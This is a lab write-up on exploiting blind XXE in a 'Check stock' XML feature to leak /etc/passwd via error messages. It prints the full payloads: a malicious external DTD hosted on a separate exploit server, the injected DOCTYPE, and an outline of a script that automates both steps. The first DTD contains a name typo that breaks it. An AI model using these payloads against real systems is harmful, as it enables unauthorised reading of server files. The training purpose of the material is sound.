### Lab: Exploiting blind XXE to retrieve data via error messages

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.

The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.

_____

Analysis and Exploit:

1. Intercept the "Check stock" feature request
    - POST **/product/stock**
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
        <stockCheck>
            <productId>1</productId>
            <storeId>1</storeId>
        </stockCheck>
    ```
2. Store the maliciuos DTD onto the exploit server:
    - POST **/** - Exploit server url
    ```xml
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exifltrate SYSTEM 'file:///noneexistant/%file;'>">
    %eval;
    %exfiltrate;
    ```
    - Save the DTD as xxe.dtd available at EXPLOIT-SERVER-URL/xxe.dtd

3. Craft payload and inject into the "Check Stock" request
    ```xml
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "EXPLOIT-SERVER-URL/xxe.dtd"> %xxe;]>
    ```
    - if "root:x:0:0:root:/root:/bin/bash" in the response text: works


_____

Script:

1. Checks if two URLs are given as arguments
    - if not print usage instructions and gracefully exit
2. Store the malicious DTD on the exploit server (second URL) | POST **/** | params: 
    - urlIsHttps: on
    - responseFile: /xxe.dtd
    - responseHead: HTTP/1.1 200 OK Content-Type: text/plain; charset=utf-8
    - responseBody: 
    ```xml
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'file:///nonexistant/%file;'>">
    %eval;
    %exfiltrate;
    ```
    - formActions: STORE

    - if status code == 200: ok
3. Send payload exploiting the "Check stock" functionality | POST **/product/stock** | params: 'xml payload'
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "EXPLOIT-SERVER-URL/xxe.dtd"> %xxe;]>
        <stockCheck>
            <productId>1</productId>
            <storeId>1</storeId>
        </stockCheck>
    ```

    - if "root:x:0:0:root:/root:/bin/bash" in response text: exploit works